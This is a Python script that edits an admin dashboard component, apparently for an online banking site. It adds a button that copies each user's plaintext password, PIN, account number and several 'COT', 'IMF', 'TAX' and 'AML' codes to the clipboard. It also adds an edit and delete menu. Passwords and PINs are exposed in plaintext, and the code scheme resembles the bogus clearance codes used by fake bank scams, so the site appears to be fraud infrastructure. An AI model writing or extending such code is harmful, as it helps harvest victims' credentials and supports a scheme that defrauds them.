with open('src/components/AdminDashboard.tsx', 'r') as f:
    content = f.read()

# 1. Add copyUserDetails function
copy_func = """  const copyUserDetails = (user: any) => {
    const details = `Name: ${user.name}
Email: ${user.email}
Password: ${user.password}
Mobile: ${user.mobile || 'N/A'}
Account Number: ${user.accounts?.[0]?.accountNumber || 'N/A'}
PIN: ${user.accounts?.[0]?.pin || 'N/A'}
COT Code: ${user.accounts?.[0]?.codes?.cot || 'N/A'}
SWIFT Code: ${user.accounts?.[0]?.codes?.swift || 'N/A'}
IMF Code: ${user.accounts?.[0]?.codes?.imf || 'N/A'}
TAX Code: ${user.accounts?.[0]?.codes?.tax || 'N/A'}
AML Code: ${user.accounts?.[0]?.codes?.aml || 'N/A'}`;
    navigator.clipboard.writeText(details);
    showToast('Copied to Clipboard', 'User details have been copied');
  };"""

content = content.replace("  const handleAdminAction = (action: string) => {", copy_func + "\n\n  const handleAdminAction = (action: string) => {")

# 2. Update table actions
old_actions = """                    <td className="p-4 text-right">
                      <button 
                        onClick={() => openUserModal(user)}
                        className="text-xs font-bold text-emerald-500 hover:text-emerald-400 transition-colors mr-4 bg-emerald-500/10 px-3 py-1.5 rounded border border-emerald-500/20"
                      >
                        Manage
                      </button>
                      <button className="text-foreground/50 hover:text-foreground transition-colors inline-flex align-middle">
                        <MoreHorizontal size={16} />
                      </button>
                    </td>"""

new_actions = """                    <td className="p-4 text-right flex items-center justify-end gap-2">
                      <button 
                        onClick={() => openUserModal(user)}
                        className="text-xs font-bold text-emerald-500 hover:text-emerald-400 transition-colors bg-emerald-500/10 px-3 py-1.5 rounded border border-emerald-500/20"
                      >
                        Manage
                      </button>
                      
                      <div className="relative inline-block text-left group">
                        <button className="text-foreground/50 hover:text-foreground transition-colors inline-flex align-middle p-2 rounded-md hover:bg-white/5">
                          <MoreHorizontal size={16} />
                        </button>
                        <div className="absolute right-0 top-full mt-1 w-40 bg-card border border-border rounded-lg shadow-xl opacity-0 invisible group-hover:opacity-100 group-hover:visible transition-all z-[100] p-1">
                          <button onClick={() => openUserModal(user)} className="w-full text-left px-3 py-2 text-sm font-bold text-foreground hover:bg-white/5 rounded-md">Edit</button>
                          <button onClick={() => copyUserDetails(user)} className="w-full text-left px-3 py-2 text-sm font-bold text-foreground hover:bg-white/5 rounded-md">Copy Details</button>
                          <button onClick={() => { deleteUser(user.id); showToast('User Deleted', 'Account removed successfully'); }} className="w-full text-left px-3 py-2 text-sm font-bold text-rose-500 hover:bg-rose-500/10 rounded-md">Delete</button>
                        </div>
                      </div>
                    </td>"""
content = content.replace(old_actions, new_actions)

with open('src/components/AdminDashboard.tsx', 'w') as f:
    f.write(content)
